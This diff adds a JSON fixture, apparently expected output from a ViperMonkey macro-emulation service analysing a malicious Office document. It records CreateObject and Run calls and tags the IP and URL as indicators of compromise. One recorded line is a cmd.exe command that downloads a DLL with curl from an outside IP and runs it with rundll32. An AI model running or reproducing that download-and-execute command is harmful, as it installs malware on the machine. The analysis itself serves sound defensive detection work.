@@ -1,0 +1,139 @@
+{
+  "extra": {
+    "drop_file": false,
+    "score": 10,
+    "sections": [
+      {
+        "auto_collapse": false,
+        "body": null,
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {
+          "technique": {
+            "macro": [
+              "Contains VBA Macro(s)"
+            ]
+          }
+        },
+        "title_text": "Recorded Actions:",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Action: Start Regular Emulation, Parameters: ",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {},
+        "title_text": "All wildcard matches will match",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "Action: CreateObject, Parameters: ['WScript.Shell']\nAction: CreateObject, Parameters: ['WScript.Shell']\nAction: Run, Parameters: ['cmd.exe /c curl -o fd.dll http://64.225.8.202/1Moch7/160223 && rundll32 fd.dll,N115', 6, 'wscript.shell']\nAction: Run, Parameters: dll,N115",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 1,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {},
+        "title_text": "Interesting Function Call",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "http://64.225.8.202/1Moch7/160223\n64.225.8.202",
+        "body_config": {},
+        "body_format": "TEXT",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": {
+          "attack_ids": [],
+          "frequency": 1,
+          "heur_id": 4,
+          "score": 10,
+          "score_map": {},
+          "signatures": {}
+        },
+        "promote_to": null,
+        "tags": {
+          "network": {
+            "static": {
+              "ip": [
+                "64.225.8.202"
+              ],
+              "uri": [
+                "http://64.225.8.202/1Moch7/160223"
+              ]
+            }
+          }
+        },
+        "title_text": "ViperMonkey has found the following IOCs:",
+        "zeroize_on_tag_safe": false
+      },
+      {
+        "auto_collapse": false,
+        "body": "CreateObject: Creates and returns a reference to an ActiveX object.\nRun: Runs a macro or calls a function. This can be used to run a macro written in Visual Basic or the Microsoft Office macro languages, or to run a function in a DLL or XLL.",
+        "body_config": {},
+        "body_format": "MEMORY_DUMP",
+        "classification": "TLP:C",
+        "depth": 0,
+        "heuristic": null,
+        "promote_to": null,
+        "tags": {},
+        "title_text": "VBA functions called",
+        "zeroize_on_tag_safe": false
+      }
+    ]
+  },
+  "files": {
+    "extracted": [],
+    "supplementary": [
+      {
+        "name": "vipermonkey_output.log",
+        "sha256": "72f5e74a3257021582ad539b20da93ee3c4d71a97d3c90263f3a8f3f88060f86"
+      }
+    ]
+  },
+  "results": {
+    "heuristics": [
+      {
+        "attack_ids": [],
+        "heur_id": 4,
+        "signatures": []
+      }
+    ],
+    "tags": {
+      "network.static.ip": [
+        {
+          "heur_id": 4,
+          "signatures": [],
+          "value": "64.225.8.202"
+        }
+      ],
+      "network.static.uri": [
+        {
+          "heur_id": 4,
+          "signatures": [],
+          "value": "http://64.225.8.202/1Moch7/160223"
+        }
+      ],
+      "technique.macro": [
+        {
+          "heur_id": null,
+          "signatures": [],
+          "value": "Contains VBA Macro(s)"
+        }
+      ]
+    },
+    "temp_submission_data": {}
+  }
+}
